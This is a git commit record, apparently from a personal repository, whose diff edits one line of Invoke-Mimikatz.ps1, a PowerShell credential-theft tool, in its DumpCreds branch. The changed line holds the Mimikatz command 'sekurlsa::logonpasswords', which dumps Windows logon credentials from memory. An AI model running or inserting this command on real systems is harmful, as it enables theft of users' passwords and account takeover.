d364e02c45aa6cd7202d5073fde911a3091b82a9
git-oaktree <git-oaktree@users.noreply.github.com>
2020-02-07 21:47:35 -0500

    one last test
    one last test

--- Invoke-Mimikatz.ps1
+++ Invoke-Mimikatz.ps1
@@ -2707,7 +2707,7 @@ Function Main
 
 	if ($PsCmdlet.ParameterSetName -ieq "DumpCreds")
 	{
-		$ExeArgs = "sekurlsa::logonpasswords exit"
+		$ExeArgs = "sekurlsa::logonpasswords exit test"
 	}
     elseif ($PsCmdlet.ParameterSetName -ieq "DumpCerts")
     {
